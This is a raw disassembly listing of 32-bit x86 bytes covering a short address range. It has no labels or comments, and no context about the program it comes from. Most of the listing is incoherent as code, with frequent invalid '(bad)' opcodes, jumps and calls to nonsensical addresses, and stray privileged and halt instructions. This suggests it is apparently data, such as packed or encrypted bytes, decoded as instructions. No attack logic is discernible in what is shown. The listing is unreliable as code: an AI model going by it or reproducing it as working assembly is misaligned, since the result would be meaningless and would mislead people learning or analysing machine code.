  40b0c6:	add    cl,bl
  40b0c8:	pop    esp
  40b0c9:	loopne 0x40b109
  40b0cb:	mov    edi,0xfa32e36f
  40b0d0:	xchg   edx,eax
  40b0d1:	lea    esi,[ebx]
  40b0d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0d4:	leave  
  40b0d5:	sub    ecx,ebx
  40b0d7:	imul   esp,eax,0x1c39a061
  40b0dd:	ds aam 0x5f
	...
  40b0fc:	add    BYTE PTR [eax],al
  40b0fe:	add    DWORD PTR [edi],ebp
  40b100:	(bad)  
  40b101:	xor    bh,BYTE PTR [ebp-0x17d23296]
  40b107:	cmp    eax,ecx
  40b109:	add    al,ch
  40b10b:	ret    
  40b10c:	int    0x98
  40b10e:	repnz int3 
  40b110:	rcr    ah,0x6
  40b113:	idiv   ecx
  40b115:	in     al,dx
  40b116:	rcr    ah,1
  40b118:	(bad)  
  40b119:	aad    0xf8
  40b11b:	jmp    0xf7579513
  40b120:	lock out 0x67,eax
  40b123:	jmp    0xc13ba31e
  40b128:	repz hlt 
  40b12a:	repnz repnz mov ah,0xba
  40b12e:	and    eax,0x3afef1f2
  40b133:	mov    eax,ebp
  40b135:	aad    0x10
  40b137:	fdivp  st(7),st
  40b139:	call   FWORD PTR [eax-0x4b081601]
  40b13f:	add    eax,DWORD PTR [eax]
  40b141:	add    BYTE PTR [edi+0x268cb99b],dl
  40b147:	mov    DWORD PTR [edi+0x815084],edx
  40b14d:	add    BYTE PTR [eax-0x5ac6cfd8],bh
  40b153:	ss ds jle 0x40b15c
  40b157:	cld    
  40b158:	(bad)  
  40b159:	jmp    FWORD PTR [esp+esi*1+0x22512d24]
  40b160:	sub    bh,BYTE PTR [eax+eax*1]
	...
  40b17f:	add    BYTE PTR [edx],cl
  40b181:	and    al,0x2b
  40b183:	sub    ah,BYTE PTR [ebx+eax*1+0x0]
  40b187:	add    BYTE PTR [ebx+0x3b],cl
  40b18a:	sub    al,0x3b
  40b18c:	adc    al,0x27
  40b18e:	add    BYTE PTR ds:[edi],dl
  40b191:	cmp    al,0x55
  40b193:	inc    esp
  40b194:	xor    al,BYTE PTR [ecx+0x48]
  40b197:	jne    0x40b1dd
  40b199:	dec    ecx
  40b19a:	push   ebp
  40b19b:	inc    eax
  40b19c:	jo     0x40b1ed
  40b19e:	push   edi
  40b19f:	add    BYTE PTR ds:0xb22fe713,cl
  40b1a5:	call   ebp
  40b1a7:	xor    ebp,DWORD PTR [esi+0xd000318]
  40b1ad:	test   eax,0xca968e75
  40b1b2:	or     ch,BYTE PTR [ebx-0xda133e4]
  40b1b8:	sub    al,0xf5
  40b1ba:	sbb    eax,0x3e99a5f6
  40b1bf:	ror    BYTE PTR ds:0x542adb25,0xb
  40b1c6:	jmp    0x359c6cf
  40b1cb:	add    BYTE PTR ds:0xceda2eee,cl
  40b1d1:	not    BYTE PTR [eax]
  40b1d3:	shr    dl,cl
  40b1d5:	add    al,0x1d
  40b1d7:	call   0xfd4b06b1
  40b1dc:	lods   al,BYTE PTR ds:[esi]
  40b1dd:	and    BYTE PTR [eax+eax*1],cl
  40b1e0:	or     eax,0xf50b31
	...
  40b201:	add    BYTE PTR [ecx-0x2f14d2a1],ch
  40b207:	push   0x36
  40b209:	ror    BYTE PTR ds:0xc0d02664,1
  40b20f:	cmp    al,0x8
  40b211:	into   
  40b212:	xchg   ebp,eax
  40b213:	dec    ebp
  40b214:	sbb    esi,ebp
  40b216:	or     eax,0xf77288df
  40b21b:	aad    0xa6
  40b21d:	gs aad 0xe1
  40b220:	shl    DWORD PTR [ecx-0x39],0xc8
  40b224:	cdq    
  40b225:	inc    ebx
  40b226:	leave  
  40b227:	call   0xda1506e6
  40b22c:	add    eax,DWORD PTR [eax]
  40b22e:	or     eax,0x928284ad
  40b233:	bound  esp,QWORD PTR [esi]
  40b235:	fisttp QWORD PTR ds:0xcb87c800
  40b23b:	mov    esi,ebx
  40b23d:	int    0x22
  40b23f:	loope  0x40b229
  40b241:	add    ecx,DWORD PTR ds:0x2d234f00
  40b247:	sbb    al,0x64
  40b249:	or     BYTE PTR [ebx+0xd03e97f],0x0
  40b250:	ins    DWORD PTR es:[edi],dx
  40b251:	push   ebp
  40b252:	pop    esi
  40b253:	push   ebp
  40b254:	jg     0x40b2a8
  40b256:	addr16 inc edi
  40b258:	push   ebp
  40b259:	dec    esp
  40b25a:	mov    bl,0x5f
  40b25c:	inc    esi
  40b25d:	add    al,0xd
  40b25f:	add    ah,bh
  40b261:	loop   0x40b292
  40b263:	(bad)  
  40b265:	fiadd  WORD PTR [eax]
	...
  40b283:	add    BYTE PTR [edi],bh
  40b285:	add    BYTE PTR [esi],dh
  40b287:	sbb    eax,0x3e910e3
  40b28c:	or     eax,0xa14e5200
  40b291:	push   ebp
  40b292:	xor    BYTE PTR [ebx-0x59],dl
  40b295:	adc    ch,BYTE PTR [ebp+0x5b]
  40b298:	outs   dx,DWORD PTR ds:[esi]
  40b299:	dec    esi
  40b29a:	jmp    0x2240bfa2
  40b29f:	sahf   
  40b2a0:	test   DWORD PTR cs:[edi],edi
  40b2a3:	mov    ds:0xa034e234,eax
  40b2a8:	ss pushf 
  40b2aa:	cmp    BYTE PTR [ecx-0x55e6fa5e],bl
  40b2b0:	dec    esi
  40b2b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2b2:	or     al,0xb3
  40b2b4:	cmp    eax,0xb44c8700
  40b2b9:	pop    ebp
  40b2ba:	pop    esp
  40b2bb:	pop    esp
  40b2bc:	mov    ah,0x45
  40b2be:	xchg   BYTE PTR [ebp-0x55],bh
  40b2c1:	bound  eax,QWORD PTR [eax+0x62]
  40b2c4:	mov    al,ds:0xd034459
  40b2c9:	add    BYTE PTR [esi+0x189444],cl
  40b2cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2d0:	sbb    esi,DWORD PTR [edi]
  40b2d2:	(bad)  
  40b2d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2d4:	adc    al,0x38
  40b2d6:	and    BYTE PTR [eax-0x34],0x3d
  40b2da:	retf   0xe3a
  40b2dd:	add    BYTE PTR [eax],al
  40b2df:	adc    bh,BYTE PTR [esp+eiz*4]
  40b2e2:	cmp    esi,eax
  40b2e4:	aas    
  40b2e5:	in     al,0x12
  40b2e7:	fiadd  DWORD PTR [eax]
	...
  40b305:	add    BYTE PTR [eax],dh
  40b307:	jmp    0xef73bf5f
  40b30c:	sbb    eax,0x6a9469ee
  40b311:	jmp    0x3440b324
  40b316:	xor    eax,0xf5ec0000
  40b31b:	lahf   
  40b31c:	push   esi
  40b31d:	mov    esi,0x6000000e
  40b322:	lea    edi,[ebp+ecx*4+0x59]
  40b326:	bound  esi,QWORD PTR [edx-0x62]
  40b329:	jmp    0x7040b33c
  40b32e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b32f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b330:	pop    ebp
  40b331:	popf   
  40b332:	xchg   ecx,eax
  40b333:	icebp  
  40b334:	jns    0x40b37d
  40b336:	jg     0x40b2db
  40b338:	push   esi
  40b339:	cmp    al,0x74
  40b33b:	scas   eax,DWORD PTR es:[edi]
  40b33c:	(bad)  
  40b33d:	mov    edx,0xc6f5121e
  40b342:	out    dx,eax
  40b343:	inc    edi
  40b344:	sar    DWORD PTR [esi+edx*1-0x64803f2],1
  40b34b:	or     DWORD PTR [esi-0x1ae50b76],esp
  40b351:	sar    bh,0x13
  40b354:	lock fwait
  40b356:	or     BYTE PTR [ecx+0x52e45000],al
  40b35c:	mov    ch,0x45
  40b35e:	fcom   QWORD PTR [ebp-0x4f]
  40b361:	dec    eax
  40b362:	aam    0x4c
  40b364:	out    0x0,al
  40b366:	je     0x40b368
	...
  40b388:	push   ebp
  40b389:	cmp    al,0x3e
  40b38b:	cmp    dh,BYTE PTR [ecx]
  40b38d:	or     eax,0x56d1a19
  40b392:	or     al,0x16
  40b394:	inc    eax
  40b395:	add    eax,DWORD PTR ds:0x14134412
  40b39b:	pop    edx
  40b39c:	jns    0x40b3b7
  40b39e:	adc    BYTE PTR ds:0x16151422,bl
  40b3a4:	jo     0x40b3f0
  40b3a6:	push   esi
  40b3a7:	push   ebx
  40b3a8:	cs ds (bad) 
  40b3ab:	inc    DWORD PTR [esp+edi*4-0x780f4443]
  40b3b2:	call   0x7197:0x8c807c9b
  40b3b9:	add    BYTE PTR [esi-0x6c6d8a6d],0xc1
  40b3c0:	and    BYTE PTR [esp+ecx*4-0x6d628966],al
  40b3c7:	sahf   
  40b3c8:	inc    ebp
  40b3c9:	(bad)  
  40b3ca:	rcl    edx,cl
  40b3cc:	pop    ds
  40b3cd:	jmp    0xa8619fb7
  40b3d2:	mov    esp,0xafadabbc
  40b3d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3d8:	lods   eax,DWORD PTR ds:[esi]
  40b3d9:	in     al,0xe2
  40b3db:	mov    ah,0xde
  40b3dd:	sar    bh,1
  40b3df:	push   DWORD PTR [edi-0x4ce30000]
  40b3e5:	adc    edx,DWORD PTR [ecx+eax*1]
  40b3e8:	(bad)  
  40b3e9:	adc    edx,DWORD PTR ds:0x56
	...
  40b407:	add    BYTE PTR [eax],al
  40b409:	add    BYTE PTR [edx-0x46f5f5af],ch
  40b40f:	dec    ebp
  40b410:	add    eax,0x4809880e
  40b415:	adc    BYTE PTR [eax*1+0x1c0d070c],cl
  40b41c:	add    ecx,DWORD PTR [eax]
  40b41e:	add    eax,0xd00032b
  40b423:	lods   al,BYTE PTR ds:[esi]
  40b424:	sub    DWORD PTR [ebp+0x31998],esi
  40b42a:	or     eax,0xd0798aef
  40b42f:	add    DWORD PTR [ecx-0x6de41bd1],ebx
  40b435:	jge    0x40b3f0
  40b437:	and    cl,BYTE PTR [ebx-0x6902148f]
  40b43d:	jb     0x40b3eb
  40b43f:	xor    ecx,esp
  40b441:	sub    al,0xb5
  40b443:	xor    bl,BYTE PTR [edi-0x5fba5394]
  40b449:	pop    es
  40b44a:	or     ebx,DWORD PTR [ecx]
  40b44c:	add    eax,DWORD PTR [eax]
  40b44e:	or     eax,0xbe51bdf
  40b453:	icebp  
  40b454:	and    bl,bh
  40b456:	scas   al,BYTE PTR es:[edi]
  40b457:	retf   
  40b458:	or     ebx,esi
  40b45a:	repnz test eax,0x8cf8a25e
  40b460:	jo     0x40b462
  40b462:	or     eax,0xd6c453b5
  40b467:	rol    DWORD PTR [eax-0x37],1
  40b46a:	shl    eax,cl
  40b46c:	pop    ebx
	...
  40b489:	add    BYTE PTR [eax],al
  40b48b:	add    BYTE PTR ds:0xb1e00a9b,cl
  40b491:	xor    ch,dl
  40b493:	cld    
  40b494:	test   al,0x92
  40b496:	add    eax,DWORD PTR [eax]
  40b498:	or     eax,0xa9f7f68c
  40b49d:	cmp    edi,ebp
  40b49f:	call   0x5f6a:0xefa9470d
  40b4a6:	test   BYTE PTR [ebx-0x4850719d],dh
  40b4ac:	arpl   WORD PTR [edi],si
  40b4ae:	(bad)  
  40b4af:	sti    
  40b4b0:	xchg   esi,eax
  40b4b1:	push   DWORD PTR [ebx+0x5860b897]
  40b4b7:	out    0xb2,al
  40b4b9:	push   ecx
  40b4ba:	push   esi
  40b4bb:	mov    edi,0xf38209b5
  40b4c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4c1:	cmp    eax,0x46a9899b
  40b4c6:	dec    ecx
  40b4c7:	stos   BYTE PTR es:[edi],al
  40b4c8:	cmp    eax,0x768e576b
  40b4cd:	cmp    DWORD PTR [eax-0xc],edi
  40b4d0:	push   si
  40b4d2:	jmp    0x4740c1da
  40b4d7:	in     al,dx
  40b4d8:	and    al,0x15
  40b4da:	push   ebx
  40b4db:	repz and BYTE PTR [ecx*2-0x10fff2fc],cl
  40b4e3:	sbb    ecx,DWORD PTR [ecx]
  40b4e5:	mov    edx,0xd03e8
  40b4ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4eb:	popa   
  40b4ec:	mov    ah,0xff
  40b4ee:	data16 aad 0x0
	...
  40b50d:	add    BYTE PTR [edi-0x27788e8f],ah
  40b513:	bound  ebp,QWORD PTR [edi-0x23]
  40b516:	in     eax,0x73
  40b518:	xor    eax,0x7601f285
  40b51d:	retf   0x6c99
  40b520:	sub    al,0x8e
  40b522:	jge    0x40b55e
  40b524:	jmp    0x7d40c22c
  40b529:	add    ebp,DWORD PTR [edx-0x6b]
  40b52c:	call   0xac40c234
  40b531:	mov    ah,0xd1
  40b533:	add    eax,0x2d80f7e1
  40b538:	lods   al,BYTE PTR ds:[esi]
  40b539:	add    ecx,DWORD PTR ds:0xadf9c700
  40b53f:	jo     0x40b59c
  40b541:	(bad)  
  40b542:	mov    ds:0xc0c99901,al
  40b547:	pop    ecx
  40b548:	add    BYTE PTR [edx+ebx*4-0x68ac00ff],cl
  40b54f:	jge    0x40b4d2
  40b551:	mov    ch,0x66
  40b553:	shl    BYTE PTR es:[eax+0x62],1
  40b557:	add    edi,edi
  40b559:	daa    
  40b55a:	in     eax,0x9b
  40b55c:	addr16 std 
  40b55e:	out    dx,al
  40b55f:	lods   al,BYTE PTR ds:[esi]
  40b560:	sub    bh,BYTE PTR [eax-0x4bd95ada]
  40b566:	sbb    ah,BYTE PTR [ecx-0x42d13fde]
  40b56c:	call   FWORD PTR [edi-0x62]
  40b56f:	arpl   WORD PTR [eax],ax
  40b571:	inc    ebx
	...
  40b58e:	add    BYTE PTR [eax],al
  40b590:	push   edi
  40b591:	cmp    ecx,eax
  40b593:	aas    
  40b594:	push   cs
  40b595:	add    BYTE PTR [eax],al
  40b597:	loope  0x40b5b6
  40b599:	sti    
  40b59a:	adc    bh,ch
  40b59c:	scas   eax,DWORD PTR es:[edi]
  40b59d:	(bad)  
  40b59e:	dec    DWORD PTR [ecx]
  40b5a0:	out    0xc3,al
  40b5a2:	jl     0x40b5b1
  40b5a4:	out    0xcf,eax
  40b5a6:	cmp    BYTE PTR [edi+0x6c00000e],bh
  40b5ac:	retf   0xa848
  40b5af:	pop    esi
  40b5b0:	mov    bl,0x3e
  40b5b2:	fnstcw WORD PTR [edx]
  40b5b4:	mov    dl,0x2
  40b5b6:	mov    eax,ds:0x997d9869
  40b5bb:	xor    eax,0xe9be37bf
  40b5c0:	push   cs
  40b5c1:	add    BYTE PTR [eax],al
  40b5c3:	setns  BYTE PTR [ebp*8-0x43ec2acb]
  40b5cb:	dec    ebx
  40b5cc:	test   BYTE PTR [edi-0x3],dl
  40b5cf:	rol    edx,1
  40b5d1:	add    bh,bh
  40b5d3:	hlt    
  40b5d4:	adc    eax,0xef01cd5
  40b5d9:	add    BYTE PTR [eax],al
  40b5db:	push   cs
  40b5dc:	jmp    0xfffc:0xc5001af9
  40b5e3:	dec    ecx
  40b5e5:	or     esi,edx
  40b5e7:	not    BYTE PTR [esi+0x41]
  40b5ea:	stos   DWORD PTR es:[edi],eax
  40b5eb:	lods   eax,DWORD PTR ds:[esi]
  40b5ec:	xchg   ebx,eax
  40b5ed:	pop    edx
  40b5ee:	jmp    0xed6754df
  40b5f3:	call   0x40b5f8
	...
  40b610:	add    BYTE PTR [eax],al
  40b612:	mov    ds:0xc4a0ad58,al
  40b617:	ds cmc 
  40b619:	lock call 0xf945:0xbca8a550
  40b621:	jmp    0xf4da23a7
  40b626:	mov    al,ds:0x6cd6cb30
  40b62b:	sbb    edi,DWORD PTR [edi-0x7fca0d37]
  40b631:	add    BYTE PTR [eax-0x4b6b5ea3],bh
  40b637:	sti    
  40b638:	(bad)  
  40b639:	(bad)  
  40b63a:	cmp    edi,edx
  40b63c:	add    BYTE PTR [esp+esi*1],al
  40b63f:	mov    ah,0x5d
  40b641:	pop    edi
  40b642:	sub    bl,ah
  40b644:	sbb    eax,0x16df2d09
  40b649:	or     al,0xe1
  40b64b:	and    BYTE PTR [esi],al
  40b64d:	or     eax,DWORD PTR ds:0xa44a4f16
  40b653:	xor    BYTE PTR [eax],bl
  40b655:	sbb    bh,ah
  40b657:	adc    BYTE PTR [edi],al
  40b659:	sbb    al,0xda
  40b65b:	ss xor al,0x20
  40b65e:	into   
  40b65f:	ds aas 
  40b661:	jg     0x40b634
  40b663:	aas    
  40b664:	cmp    esi,DWORD PTR [ebx-0x6a]
  40b667:	aaa    
  40b668:	cmp    eax,0x6f7a7b3d
  40b66d:	and    BYTE PTR [eax],bl
  40b66f:	xor    DWORD PTR [eax],esp
  40b671:	sub    DWORD PTR ds:0x712909,eax
	...
  40b693:	add    BYTE PTR ds:0xd000448,cl
  40b699:	dec    ebx
  40b69a:	gs sub ecx,DWORD PTR fs:[esi+0x6c]
  40b69f:	push   0x26
  40b6a1:	dec    ebp
  40b6a2:	outs   dx,DWORD PTR ds:[esi]
  40b6a3:	outs   dx,BYTE PTR ds:[esi]
  40b6a4:	sbb    eax,0x1737638
  40b6a9:	aaa    
  40b6aa:	jns    0x40b724
  40b6ac:	pop    es
  40b6ad:	or     BYTE PTR [edi+0x69],ah
  40b6b0:	jmp    0x7520:0xd007b13
  40b6b7:	push   edi
  40b6b8:	cli    
  40b6b9:	adc    eax,0xfabd343a
  40b6be:	outs   dx,DWORD PTR ds:[esi]
  40b6bf:	arpl   ax,si
  40b6c1:	stc    
  40b6c2:	jae    0x40b6c4
  40b6c4:	or     eax,0xd2502cb
  40b6c9:	cli    
  40b6ca:	add    ah,BYTE PTR [edx]
  40b6cc:	or     eax,0xd0002e9
  40b6d1:	or     eax,DWORD PTR [eiz*1+0x2202da0d]
  40b6d8:	or     eax,0xd250409
  40b6dd:	mov    edx,0xb40d0002
  40b6e2:	jae    0x40b749
  40b6e4:	lahf   
  40b6e5:	retf   
  40b6e6:	jo     0x40b75e
  40b6e8:	cmp    eax,ebp
  40b6ea:	outs   dx,BYTE PTR ds:[esi]
  40b6eb:	ins    BYTE PTR es:[edi],dx
  40b6ec:	or     eax,0x6c6574aa
  40b6f1:	xchg   ebp,eax
  40b6f2:	gs inc ebp
  40b6f4:	arpl   WORD PTR [edi+0x7269],bx
	...
  40b716:	jp     0x40b797
  40b718:	outs   dx,BYTE PTR ds:[esi]
  40b719:	gs jae 0x40b799
  40b71c:	inc    ebp
  40b71d:	ins    BYTE PTR es:[edi],dx
  40b71e:	push   0xffffff8a
  40b720:	imul   eax,DWORD PTR [eax],0xd
  40b723:	lods   eax,DWORD PTR ds:[esi]
  40b724:	gs jae 0x40b768
  40b727:	jnp    0x40b799
  40b729:	jns    0x40b773
  40b72b:	add    BYTE PTR [edi+0x76],dl
  40b72e:	and    al,0x72
  40b730:	dec    esi
  40b731:	outs   dx,BYTE PTR ds:[esi]
  40b732:	and    BYTE PTR [ebp+0x47],ah
  40b735:	js     0x40b786
  40b737:	ins    BYTE PTR es:[edi],dx
  40b738:	arpl   WORD PTR ds:[esi],si
  40b73b:	add    BYTE PTR [ebx],al
  40b73d:	push   0x69450a08
  40b742:	and    DWORD PTR [eax],esp
  40b744:	or     ebp,DWORD PTR [ecx]
  40b746:	(bad)  
  40b747:	and    esp,ebx
  40b749:	or     esp,esi
  40b74b:	gs leave 
  40b74d:	push   0x781a68f5
  40b752:	sub    eax,0x2f72cc22
  40b757:	and    BYTE PTR [esi],al
  40b759:	outs   dx,DWORD PTR ds:[esi]
  40b75a:	fldcw  WORD PTR [esi-0x37]
  40b75d:	addr16 or eax,0xec040b00
  40b763:	(bad)  
  40b764:	cld    
  40b765:	add    ecx,DWORD PTR ds:0xae692900
  40b76b:	addr16 (bad) 
  40b76d:	and    ebp,DWORD PTR [edx+0x710c765]
  40b773:	and    eax,0x641710da
  40b778:	les    ebp,FWORD PTR [edi+0x0]
	...
  40b797:	add    ch,ch
  40b799:	cs scas eax,DWORD PTR es:[edi]
  40b79b:	and    ebp,edi
  40b79d:	and    al,0xba
  40b79f:	and    DWORD PTR [eax],eax
  40b7a1:	or     ch,cl
  40b7a3:	add    ecx,DWORD PTR ds:0x6e03fe00
  40b7a9:	add    cl,cl
  40b7ab:	add    ebp,DWORD PTR [edi]
  40b7ad:	add    ah,al
  40b7af:	add    edi,DWORD PTR [esi+0x0]
  40b7b2:	retf   
  40b7b3:	add    ecx,DWORD PTR ds:0x7203aa00
  40b7b9:	add    BYTE PTR [ebx+eax*1+0x379003e],dl
  40b7c0:	push   0xe8a0000
  40b7c5:	add    BYTE PTR [eax],al
  40b7c7:	jmp    0xe940b7da
  40b7cc:	push   cs
  40b7cd:	add    BYTE PTR [eax],al
  40b7cf:	jmp    0xe940b7e2
  40b7d4:	push   cs
  40b7d5:	(bad)  
  40b7d6:	call   FWORD PTR [eax]
  40b7d8:	out    0x2f,eax
  40b7da:	add    BYTE PTR [esi+0x720041f3],bl
  40b7e0:	fld    QWORD PTR [ecx+0x0]
  40b7e3:	add    DWORD PTR [ebx],edi
  40b7e5:	inc    edx
  40b7e6:	add    BYTE PTR [edx],dl
  40b7e8:	xor    eax,DWORD PTR [edx+0x0]
  40b7eb:	xchg   ebx,eax
  40b7ec:	sub    BYTE PTR [edx+0x0],al
  40b7ef:	stos   DWORD PTR es:[edi],eax
  40b7f0:	cmp    al,BYTE PTR [edx+0x0]
  40b7f3:	inc    ebp
  40b7f4:	and    al,0x42
  40b7f6:	add    BYTE PTR [ecx],ah
  40b7f8:	es inc edx
  40b7fa:	add    BYTE PTR [ecx+0x0],dl
	...
  40b818:	add    BYTE PTR [eax],al
  40b81a:	pop    ss
  40b81b:	inc    edx
  40b81c:	add    BYTE PTR [ebp-0x9ffbdee],bh
  40b822:	or     al,BYTE PTR [edx+0x0]
  40b825:	add    DWORD PTR [edi],0xf7640042
  40b82b:	inc    ecx
  40b82c:	add    BYTE PTR [ebx-0x7effbe2f],cl
  40b832:	int    0x41
  40b834:	add    BYTE PTR [edx-0x75ffbe33],cl
  40b83a:	int    0x41
  40b83c:	add    BYTE PTR [edx-0x7effbe33],cl
  40b842:	dec    ebp
  40b843:	inc    edx
  40b844:	add    BYTE PTR [edx+0x5100424d],cl
  40b84a:	dec    ebp
  40b84b:	inc    edx
  40b84c:	add    BYTE PTR [esi+0x4d],ah
  40b84f:	inc    edx
  40b850:	add    BYTE PTR [ecx+0x31],bh
  40b853:	add    BYTE PTR [eax],al
  40b855:	mov    esp,0x760e
  40b85a:	in     al,0x0
  40b85c:	add    BYTE PTR [eax],al
  40b85e:	sbb    edx,DWORD PTR [esi+0x42]
  40b861:	add    BYTE PTR [edx+0x58],bh
  40b864:	inc    edx
  40b865:	add    BYTE PTR [eax-0x40ffbda8],ah
  40b86b:	pop    ecx
  40b86c:	inc    edx
  40b86d:	add    ah,ah
  40b86f:	pop    eax
  40b870:	inc    edx
  40b871:	add    BYTE PTR [ecx+0x59],dl
  40b874:	inc    edx
  40b875:	add    BYTE PTR [ebx+0x2f004258],dl
  40b87b:	push   ebx
  40b87c:	inc    edx
	...
  40b899:	add    BYTE PTR [eax],al
  40b89b:	add    BYTE PTR [edi+0x3f004253],ah
  40b8a1:	push   ebx
  40b8a2:	inc    edx
  40b8a3:	add    BYTE PTR [esp+eiz*2+0x56710042],dh
  40b8aa:	inc    edx
  40b8ab:	add    cl,dl
  40b8ad:	pop    ecx
  40b8ae:	inc    edx
  40b8af:	add    BYTE PTR [edx+0x1004259],cl
  40b8b5:	push   edi
  40b8b6:	inc    edx
  40b8b7:	add    BYTE PTR [eax+0x5c],ch
  40b8ba:	inc    edx
  40b8bb:	add    BYTE PTR [ebx-0x7cffffac],dl
  40b8c1:	pop    esp
  40b8c2:	inc    ebx
  40b8c3:	add    BYTE PTR [ebx+0x49],dh
  40b8c6:	add    BYTE PTR [eax],al
  40b8c8:	inc    edi
  40b8c9:	add    BYTE PTR [ecx+0x0],ah
  40b8cc:	inc    esi
  40b8cd:	add    BYTE PTR [ecx+0x0],ch
  40b8d0:	push   edx
  40b8d1:	add    BYTE PTR [ebp+0x0],ah
  40b8d4:	cmp    BYTE PTR [eax],al
  40b8d6:	add    BYTE PTR cs:[eax+0x0],cl
  40b8da:	ins    BYTE PTR es:[edi],dx
  40b8db:	add    BYTE PTR [eax+0x0],al
  40b8de:	add    BYTE PTR [eax],al
  40b8e0:	mov    edx,0xc6434940
  40b8e5:	bound  esp,QWORD PTR [ecx+0x74]
  40b8e8:	mov    edi,edi
  40b8ea:	(bad)  
  40b8eb:	jmp    FWORD PTR [edx+0xd414940]
  40b8f1:	lea    esp,[esi+0x46]
  40b8f4:	je     0x40b973
  40b8f6:	data16 add BYTE PTR ds:0x4b493fab,cl
  40b8fd:	lea    esi,[ebp+0x73]
	...
  40b91c:	add    BYTE PTR [eax],al
  40b91e:	xor    eax,0x346261a6
  40b923:	jnp    0x40b98b
  40b925:	je     0x40b934
  40b927:	sub    eax,DWORD PTR [ecx+0x49]
  40b92a:	dec    ecx
  40b92b:	inc    esp
  40b92c:	jno    0x40b9a2
  40b92e:	pop    ds
  40b92f:	inc    edx
  40b930:	jnp    0x40b932
  40b932:	or     eax,0xd42546e
  40b937:	test   BYTE PTR [edi+0x67390d40],bh
  40b93d:	inc    edx
  40b93e:	or     eax,0xd4265a9
  40b943:	sti    
  40b944:	add    ah,BYTE PTR [ebp+ecx*1+0x8]
  40b948:	add    al,0x74
  40b94a:	or     eax,0xd0002e9
  40b94f:	ss add al,0x65
  40b952:	or     eax,0xd680436
  40b957:	cld    
  40b958:	add    dh,BYTE PTR [ebp+ecx*1+0x5]
  40b95c:	add    al,0x6f
  40b95e:	or     eax,0xd6e02fa
  40b963:	sbb    DWORD PTR [edx+esi*2],eax
  40b966:	or     eax,0xd7602d0
  40b96b:	rol    BYTE PTR [edx],1
  40b96d:	ins    BYTE PTR es:[edi],dx
  40b96e:	or     eax,0xd6702cc
  40b973:	les    eax,FWORD PTR [edx]
  40b975:	add    BYTE PTR ds:0xd41851a,cl
  40b97b:	dec    eax
  40b97c:	pop    es
  40b97d:	dec    ebx
  40b97e:	cwde   
  40b97f:	test   DWORD PTR [edi],0xd0
	...
  40b99d:	add    BYTE PTR [eax],al
  40b99f:	add    BYTE PTR [eax+ebp*2],bl
  40b9a2:	mov    ebx,0xb5ffbaff
  40b9a7:	fist   DWORD PTR [esp+esi*4+0x67]
  40b9ab:	push   edi
  40b9ac:	push   ebx
  40b9ad:	std    
  40b9ae:	ins    BYTE PTR es:[edi],dx
  40b9af:	adc    BYTE PTR [ebp-0x2541bdf0],bh
  40b9b5:	sbb    dl,BYTE PTR [esi-0x24]
  40b9b8:	mov    ebp,0x903f1c05
  40b9bd:	cld    
  40b9be:	outs   dx,BYTE PTR ds:[esi]
  40b9bf:	jl     0x40b99e
  40b9c1:	adc    BYTE PTR [ebx+0x51],ch
  40b9c4:	or     eax,0x54dc35c0
  40b9c9:	mov    ah,0x37
  40b9cb:	xchg   DWORD PTR [edx-0x3b],eax
  40b9ce:	outs   dx,BYTE PTR ds:[esi]
  40b9cf:	jnp    0x40b98e
  40b9d1:	adc    BYTE PTR [ebx+0x56],ch
  40b9d4:	or     eax,0x34dc35c0
  40b9d9:	mov    ah,0x93
  40b9db:	cmp    BYTE PTR [eax+0x5d7b6efc],dl
  40b9e1:	adc    BYTE PTR [ebx+0x56],ch
  40b9e4:	or     eax,0xd4dc35c0
  40b9e9:	mov    bl,0x4f
  40b9eb:	xchg   esi,eax
  40b9ec:	push   ss
  40b9ed:	jecxz  0x40b982
  40b9ef:	dec    edi
  40b9f0:	cmp    al,0x10
  40b9f2:	arpl   WORD PTR [ecx-0x42ca45a6],dx
  40b9f8:	mov    ebp,0x169652ee
  40b9fd:	jecxz  0x40ba72
  40b9ff:	dec    edi
  40ba00:	pop    esp
  40ba01:	adc    BYTE PTR [ebx-0x6f],ah
	...
  40ba20:	add    BYTE PTR [eax],al
  40ba22:	cmp    bh,BYTE PTR [edx-0x1122434b]
  40ba28:	repnz add ecx,DWORD PTR ds:0xcf537200
  40ba2f:	dec    DWORD PTR [ebx-0x43003239]
  40ba35:	xchg   ebp,eax
  40ba36:	int3   
  40ba37:	jmp    FWORD PTR [eax]
  40ba39:	popa   
  40ba3a:	dec    edi
  40ba3b:	add    BYTE PTR [eax],al
  40ba3d:	scas   al,BYTE PTR es:[edi]
  40ba3e:	dec    ebp
  40ba3f:	push   esp
  40ba40:	and    cl,ch
  40ba42:	push   cs
  40ba43:	add    BYTE PTR [eax],al
  40ba45:	mov    ecx,0xc9544d47
  40ba4a:	push   cs
  40ba4b:	add    BYTE PTR [eax],al
  40ba4d:	ss mov dl,0x3f
  40ba50:	add    cl,cl
  40ba52:	push   cs
  40ba53:	add    BYTE PTR [eax],al
  40ba55:	pop    eax
  40ba56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba57:	aas    
  40ba58:	add    BYTE PTR [eax],dh
  40ba5a:	jbe    0x40ba9b
  40ba5c:	add    BYTE PTR [esi],ah
  40ba5e:	jbe    0x40ba9f
  40ba60:	add    BYTE PTR [ecx],dh
  40ba62:	cmp    BYTE PTR [edi],0x0
  40ba65:	pop    ebx
  40ba66:	addr16 aas 
  40ba68:	add    BYTE PTR [ebp-0x7c],cl
  40ba6b:	cmp    DWORD PTR [eax],eax
  40ba6d:	in     al,0xe
  40ba6f:	add    BYTE PTR [eax],al
  40ba71:	gs pusha 
  40ba73:	aas    
  40ba74:	add    BYTE PTR [esi+0x5b],al
  40ba77:	aas    
  40ba78:	add    BYTE PTR [edi-0x43],ah
  40ba7b:	aas    
  40ba7c:	add    cl,al
  40ba7e:	mov    eax,0xaad3003f
  40ba83:	aas    
  40ba84:	add    BYTE PTR [edx+0x0],cl
	...
  40baa3:	add    BYTE PTR ds:0x9d42003e,dh
  40baa9:	aas    
